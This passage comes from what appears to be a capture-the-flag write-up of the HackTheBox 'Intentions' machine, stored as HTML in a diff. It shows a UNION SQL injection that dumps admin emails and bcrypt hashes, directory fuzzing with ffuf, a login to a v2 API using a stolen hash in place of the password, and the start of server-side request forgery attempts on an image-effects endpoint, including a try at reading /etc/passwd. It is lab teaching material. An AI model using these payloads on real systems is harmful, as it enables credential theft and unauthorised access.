+            "updated_at": null,
+            "url": "/storage/0"
+        }
+    ]
+}
+SQLI $&gt; 
+</code></pre><br style="line-height: 0.5;"/></div>
+
+The <code>Admin</code> column contains two integer values: 1 and 0. Accounts with the <code>Admin</code> property set to 1 are considered high-privilege accounts. Therefore, I will proceed to extract the <code>email</code> and <code>password</code> information from these <code>Admin</code> users.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">SQLI</span><span class="w"> </span><span class="err">$</span><span class="o">&gt;</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="ow">ALL</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="n">email</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">admin</span><span class="o">=</span><span class="mi">1</span>
+<span class="err">{</span>
+<span class="w">    </span><span class="ss">"status"</span><span class="err">:</span><span class="w"> </span><span class="ss">"success"</span><span class="p">,</span>
+<span class="w">    </span><span class="ss">"data"</span><span class="err">:</span><span class="w"> </span><span class="o">[</span>
+<span class="n">        {</span>
+<span class="n">            "id": null,</span>
+<span class="n">            "file": "steve@intentions.htb",</span>
+<span class="n">            "genre": "$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa",</span>
+<span class="n">            "created_at": null,</span>
+<span class="n">            "updated_at": null,</span>
+<span class="n">            "url": "/storage/steve@intentions.htb"</span>
+<span class="n">        },</span>
+<span class="n">        {</span>
+<span class="n">            "id": null,</span>
+<span class="n">            "file": "greg@intentions.htb",</span>
+<span class="n">            "genre": "$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m",</span>
+<span class="n">            "created_at": null,</span>
+<span class="n">            "updated_at": null,</span>
+<span class="n">            "url": "/storage/greg@intentions.htb"</span>
+<span class="n">        }</span>
+<span class="n">    </span><span class="o">]</span>
+<span class="err">}</span>
+<span class="n">SQLI</span><span class="w"> </span><span class="err">$</span><span class="o">&gt;</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+There are two admin users. I've observed that the passwords are stored in an encrypted form, which means we can't retrieve the passwords in plaintext. One possible approach is to attempt to crack the hashes using tools such as <code>JohnTheRipper</code> or <code>Hashcat</code>. However, it's worth noting that the passwords don't appear to be present in the <code>rockyou.txt</code> wordlist.<br/><br/>
+Nonetheless, I've saved the hashes in a file for future reference.<br/><br/>
+<h3><br>API v2</br></h3><br>
+Our next step involves launching a fuzzing attack to uncover new directories and files on the website. For this purpose, I'll be utilizing the <a href="https://github.com/ffuf/ffuf">ffuf</a> tool to execute the attack.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">ffuf</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">--</span><span class="n">fc</span><span class="o">=</span><span class="mi">404</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">100</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">small</span><span class="o">-</span><span class="n">directories</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">FUZZ</span>
+
+<span class="w">        </span><span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span><span class="err">\</span><span class="w">           </span><span class="o">/</span><span class="err">'</span><span class="n">___</span><span class="err">\</span><span class="w">       </span>
+<span class="w">       </span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">__</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">__</span><span class="o">/</span><span class="w">  </span><span class="n">__</span><span class="w">  </span><span class="n">__</span><span class="w">  </span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">__</span><span class="o">/</span><span class="w">       </span>
+<span class="w">       </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="p">,</span><span class="n">__</span><span class="err">\\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="p">,</span><span class="n">__</span><span class="err">\</span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="p">,</span><span class="n">__</span><span class="err">\</span><span class="w">      </span>
+<span class="w">        </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="o">/</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="o">/</span><span class="w">      </span>
+<span class="w">         </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="err">\</span><span class="w">   </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="err">\</span><span class="w">  </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">____</span><span class="o">/</span><span class="w">  </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="err">\</span><span class="w">       </span>
+<span class="w">          </span><span class="err">\</span><span class="o">/</span><span class="n">_</span><span class="o">/</span><span class="w">    </span><span class="err">\</span><span class="o">/</span><span class="n">_</span><span class="o">/</span><span class="w">   </span><span class="err">\</span><span class="o">/</span><span class="n">___</span><span class="o">/</span><span class="w">    </span><span class="err">\</span><span class="o">/</span><span class="n">_</span><span class="o">/</span><span class="w">       </span>
+
+<span class="w">       </span><span class="n">v2</span><span class="mf">.0.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="k">Method</span><span class="w">           </span><span class="err">:</span><span class="w"> </span><span class="k">GET</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">URL</span><span class="w">              </span><span class="err">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">FUZZ</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Wordlist</span><span class="w">         </span><span class="err">:</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">small</span><span class="o">-</span><span class="n">directories</span><span class="p">.</span><span class="n">txt</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Follow</span><span class="w"> </span><span class="n">redirects</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="k">false</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Calibration</span><span class="w">      </span><span class="err">:</span><span class="w"> </span><span class="k">false</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Timeout</span><span class="w">          </span><span class="err">:</span><span class="w"> </span><span class="mi">10</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Threads</span><span class="w">          </span><span class="err">:</span><span class="w"> </span><span class="mi">100</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Matcher</span><span class="w">          </span><span class="err">:</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="nl">status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="k">Filter</span><span class="w">           </span><span class="err">:</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="nl">status</span><span class="p">:</span><span class="w"> </span><span class="mi">404</span>
+<span class="n">________________________________________________</span>
+
+<span class="o">[</span><span class="n">Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 145ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="n">js</span>
+
+<span class="o">[</span><span class="n">Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 146ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="n">css</span>
+
+<span class="o">[</span><span class="n">Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 437ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="k">admin</span>
+
+<span class="o">[</span><span class="n">Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 563ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="n">logout</span>
+
+<span class="o">[</span><span class="n">Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 293ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="n">gallery</span>
+
+<span class="o">[</span><span class="n">Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 152ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="n">fonts</span>
+
+<span class="o">[</span><span class="n">Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 152ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="n">storage</span>
+
+<span class="o">[</span><span class="n">Status: 200, Size: 1523, Words: 415, Lines: 40, Duration: 706ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span>
+
+<span class="o">::</span><span class="w"> </span><span class="nl">Progress</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">20116/20116</span><span class="o">]</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Job</span><span class="w"> </span><span class="o">[</span><span class="n">1/1</span><span class="o">]</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="mi">103</span><span class="w"> </span><span class="n">req</span><span class="o">/</span><span class="n">sec</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="nl">Duration</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">0:02:52</span><span class="o">]</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="nl">Errors</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">::</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+I've discovered a section labeled <code>admin</code>, but it appears inaccessible. To gain access, I'll need to log in as an administrator.<br/><br/>
+Now, I'm going to conduct a fuzzing operation on the <code>js</code> directory, as there's a possibility we may come across some intriguing JavaScript scripts.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">ffuf</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">--</span><span class="n">fc</span><span class="o">=</span><span class="mi">404</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">100</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">small</span><span class="o">-</span><span class="n">directories</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">FUZZ</span><span class="p">.</span><span class="n">js</span>
+
+<span class="w">        </span><span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span><span class="err">\</span><span class="w">           </span><span class="o">/</span><span class="err">'</span><span class="n">___</span><span class="err">\</span><span class="w">       </span>
+<span class="w">       </span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">__</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">__</span><span class="o">/</span><span class="w">  </span><span class="n">__</span><span class="w">  </span><span class="n">__</span><span class="w">  </span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">__</span><span class="o">/</span><span class="w">       </span>
+<span class="w">       </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="p">,</span><span class="n">__</span><span class="err">\\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="p">,</span><span class="n">__</span><span class="err">\</span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="p">,</span><span class="n">__</span><span class="err">\</span><span class="w">      </span>
+<span class="w">        </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="o">/</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="o">/</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="o">/</span><span class="w">      </span>
+<span class="w">         </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="err">\</span><span class="w">   </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="err">\</span><span class="w">  </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">____</span><span class="o">/</span><span class="w">  </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="n">_</span><span class="err">\</span><span class="w">       </span>
+<span class="w">          </span><span class="err">\</span><span class="o">/</span><span class="n">_</span><span class="o">/</span><span class="w">    </span><span class="err">\</span><span class="o">/</span><span class="n">_</span><span class="o">/</span><span class="w">   </span><span class="err">\</span><span class="o">/</span><span class="n">___</span><span class="o">/</span><span class="w">    </span><span class="err">\</span><span class="o">/</span><span class="n">_</span><span class="o">/</span><span class="w">       </span>
+
+<span class="w">       </span><span class="n">v2</span><span class="mf">.0.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="k">Method</span><span class="w">           </span><span class="err">:</span><span class="w"> </span><span class="k">GET</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">URL</span><span class="w">              </span><span class="err">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">FUZZ</span><span class="p">.</span><span class="n">js</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Wordlist</span><span class="w">         </span><span class="err">:</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">small</span><span class="o">-</span><span class="n">directories</span><span class="p">.</span><span class="n">txt</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Follow</span><span class="w"> </span><span class="n">redirects</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="k">false</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Calibration</span><span class="w">      </span><span class="err">:</span><span class="w"> </span><span class="k">false</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Timeout</span><span class="w">          </span><span class="err">:</span><span class="w"> </span><span class="mi">10</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Threads</span><span class="w">          </span><span class="err">:</span><span class="w"> </span><span class="mi">100</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Matcher</span><span class="w">          </span><span class="err">:</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="nl">status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
+<span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="k">Filter</span><span class="w">           </span><span class="err">:</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="nl">status</span><span class="p">:</span><span class="w"> </span><span class="mi">404</span>
+<span class="n">________________________________________________</span>
+
+<span class="o">[</span><span class="n">Status: 200, Size: 279176, Words: 5446, Lines: 2, Duration: 149ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="n">login</span>
+
+<span class="o">[</span><span class="n">Status: 200, Size: 310841, Words: 6285, Lines: 2, Duration: 284ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="n">gallery</span>
+
+<span class="o">[</span><span class="n">Status: 200, Size: 433792, Words: 7736, Lines: 2, Duration: 440ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="n">app</span>
+
+<span class="o">[</span><span class="n">Status: 200, Size: 311246, Words: 6584, Lines: 2, Duration: 155ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="k">admin</span>
+
+<span class="o">[</span><span class="n">Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 398ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span>
+
+<span class="o">[</span><span class="n">Status: 200, Size: 153684, Words: 2246, Lines: 2, Duration: 372ms</span><span class="o">]</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="nl">FUZZ</span><span class="p">:</span><span class="w"> </span><span class="n">mdb</span>
+
+<span class="o">::</span><span class="w"> </span><span class="nl">Progress</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">20116/20116</span><span class="o">]</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="n">Job</span><span class="w"> </span><span class="o">[</span><span class="n">1/1</span><span class="o">]</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="mi">117</span><span class="w"> </span><span class="n">req</span><span class="o">/</span><span class="n">sec</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="nl">Duration</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">0:02:38</span><span class="o">]</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="nl">Errors</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">::</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Among these files, the most prominent one is <code>admin.js</code>. I will proceed to read its content: <br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="k">admin</span><span class="p">.</span><span class="n">js</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+The file is quite extensive, but towards the end, I've come across some intriguing messages:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">Hey</span><span class="w"> </span><span class="n">team</span><span class="p">,</span><span class="w"> </span><span class="n">I</span><span class="p">'</span><span class="n">ve</span><span class="w"> </span><span class="n">deployed</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">v2</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">production</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">started</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">admin</span><span class="w"> </span><span class="n">section</span><span class="p">.</span>
+
+<span class="n">Let</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">spot</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">bugs</span><span class="p">.</span><span class="w"> </span>
+
+<span class="n">This</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">major</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">upgrade</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">users</span><span class="p">,</span><span class="w"> </span><span class="n">passwords</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">longer</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">transmitted</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">clear</span><span class="w"> </span><span class="n">text</span><span class="o">!</span><span class="w"> </span>
+
+<span class="n">By</span><span class="w"> </span><span class="n">hashing</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="n">side</span><span class="w"> </span><span class="n">there</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">risk</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">BCrypt</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">basically</span><span class="w"> </span><span class="n">uncrackable</span><span class="p">.</span>
+
+<span class="n">This</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">take</span><span class="w"> </span><span class="n">care</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">concerns</span><span class="w"> </span><span class="n">raised</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">regarding</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">lack</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">HTTPS</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="w">        </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+It mentions the existence of a version 2 for the API, and in this version, we can provide user hashes as credentials, eliminating the need to know the password in plaintext. Given that we've obtained the hashes previously, we can use them to authenticate ourselves as admin users.<br/><br/>
+Now, I'll proceed to intercept the login request:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/22.png"/><br/><br/>
+As evident in the image below, the requests were made to API version 1.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/23.png"/><br/><br/>
+First, I selected one of the admin users and provided their credentials. Subsequently, I attempted to use the hash as the password in the APIv1 login request:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/24.png"/><br/><br/>
+However, it didn't work.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/25.png"/><br/><br/>
+I'm going to attempt the login request on <code>/api/v2/auth/login</code> rather than <code>/api/v1/auth/login</code>:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/26.png"/><br/><br/>
+It returns a distinct error, indicating that we need to specify a <code>hash</code> field in the POST request. Let's modify our request:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/27.png"/><br/><br/>
+Now, let's resend the request:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/28.png"/><br/><br/>
+The response has indeed changed, providing us with a success message. Furthermore, it has issued us a session cookie.<br/><br/>
+Next, I will replace my old session cookie with the new one we've acquired:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/29.png"/><br/><br/>
+Now, we have successfully gained access to the <code>admin</code> section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/30.png"/><br/><br/>
+Here, we can observe some news. Upon closer inspection of the <code>v2 API Update</code> news, it becomes evident that they have introduced new functions related to the usage of PHP Imagick.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/31.png"/><br/><br/>
+I've identified it as PHP Imagick because the hyperlink redirects me to its source code.<br/><br/>
+Moving on to the <code>Users</code> section, we can obtain a list of users in the database:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/32.png"/><br/><br/>
+In the <code>Images</code> section, we have access to a list of images:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/33.png"/><br/><br/>
+We've observed that there are two paths for the images. One starting with <code>public</code> represents the system-level path, while the other is a web-accessible path.<br/><br/>
+Now, let's try to edit these images:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/34.png"/><br/><br/>
+It appears that we have the option to apply effects to these images. Let's experiment with the <code>CHARCOAL</code> effect:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/35.png"/><br/><br/>
+When examining the requests made while applying an effect, it becomes evident that these requests are directed to the API.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/36.png"/><br/><br/>
+The data transmitted via the POST method is as follows:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/37.png"/><br/><br/>
+We're specifying the image path and the effect in the POST request. One potential experiment is to attempt to point to a system file such as <code>/etc/passwd</code>. <br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/38.png"/><br/><br/>
+But it returns an error:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/39.png"/><br/><br/>
+Instead of specifying a system file, I will use a URL to an HTTP server hosted on my machine:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/40.png"/><br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="n">server</span><span class="w"> </span><span class="mi">80</span>
+<span class="n">Serving</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">0.0.0.0</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="p">(</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span><span class="w"> </span><span class="p">...</span>
